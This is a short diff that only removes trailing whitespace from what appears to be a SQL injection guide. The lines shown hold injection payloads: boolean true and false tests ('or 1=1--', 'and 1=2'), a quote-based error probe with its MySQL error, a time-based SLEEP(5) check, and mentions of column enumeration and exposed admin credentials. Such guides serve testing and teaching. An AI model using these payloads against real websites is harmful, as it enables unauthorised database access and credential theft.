@@ -98,7 +98,7 @@ page.asp?id=1 or 1=1
 page.asp?id=1' or 1=1--
 page.asp?id=1" or 1=1--
 
--- False condition tests  
+-- False condition tests
 page.asp?id=1 and 1=2
 page.asp?id=1' and 1=2--
 ```
@@ -356,7 +356,7 @@ GET /product.php?id=5 HTTP/1.1
 **Detection Test**:
 ```
 GET /product.php?id=5' HTTP/1.1
-Response: MySQL error - syntax error near ''' 
+Response: MySQL error - syntax error near '''
 ```
 
 **Column Enumeration**:
@@ -379,7 +379,7 @@ Response: Displays admin credentials
 
 **Confirm Vulnerability**:
 ```sql
-id=5' AND SLEEP(5)-- 
+id=5' AND SLEEP(5)--
 -- Response delayed by 5 seconds (vulnerable confirmed)
 ```
 
